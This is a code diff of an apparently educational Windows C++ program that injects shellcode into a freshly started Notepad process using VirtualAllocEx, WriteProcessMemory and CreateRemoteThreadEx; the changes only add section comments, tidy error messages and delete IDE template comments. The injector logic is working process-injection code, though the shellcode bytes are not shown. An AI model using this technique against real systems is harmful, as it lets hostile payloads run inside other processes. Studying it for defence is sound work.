@@ -45,6 +45,8 @@ unsigned char shellcode[] = {
 
 int main()
 {
+    
+    // - SECTION 1: Start process
     printf("%s To start, we will open Notepad\n", k);
     system("pause");
     STARTUPINFO si = { sizeof(si) };
@@ -63,7 +65,7 @@ int main()
         &pi);    // Pointer to PROCESS_INFORMATION structure
 
     if (!status) {
-        printf("%s failed open process, error: %ld", e, GetLastError());
+        printf("%s Failed to open process, error: %ld", e, GetLastError());
         return EXIT_FAILURE;
     }
 
@@ -71,7 +73,7 @@ int main()
     // Sleep for one second to allow Notepad to open
     std::this_thread::sleep_for(std::chrono::milliseconds(1000));
 
-    /* allocate bytes to process memory */
+    // - SECTION 2: Allocate memory space
     printf("%s Now, we will allocate the memory for our injection\n", k);
     system("pause");
     rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
@@ -79,17 +81,18 @@ int main()
 
     printf("%s Now we will write the shellcode into the allocated memory\n", k);
     system("pause");
-    /* actually write that allocated memory to the process memory */
+
+    // - SECTION 3: Write Memory space
     WriteProcessMemory(hProcess, rBuffer, shellcode, sizeof(shellcode), NULL);
     printf("%s wrote %zu-bytes to process memory\n", k, sizeof(shellcode));
 
-    /* create thread to run our payload */
+    // - SECTION 4: Create thread to run our payload
     printf("%s Now we will create the thread that will execute our shellcode\n", k);
     system("pause");
     hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
 
     if (hThread == NULL) {
-        printf("%s failed to get a handle to the thread, error: %ld", e, GetLastError());
+        printf("%s Failed to get a handle to the thread, error: %ld", e, GetLastError());
         CloseHandle(hProcess);
         return EXIT_FAILURE;
     }
@@ -104,14 +107,3 @@ int main()
 
     return EXIT_SUCCESS;
 }
-
-// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
-// Debug program: F5 or Debug > Start Debugging menu
-
-// Tips for Getting Started: 
-//   1. Use the Solution Explorer window to add/manage files
-//   2. Use the Team Explorer window to connect to source control
-//   3. Use the Output window to see build output and other messages
-//   4. Use the Error List window to view errors
-//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
-//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
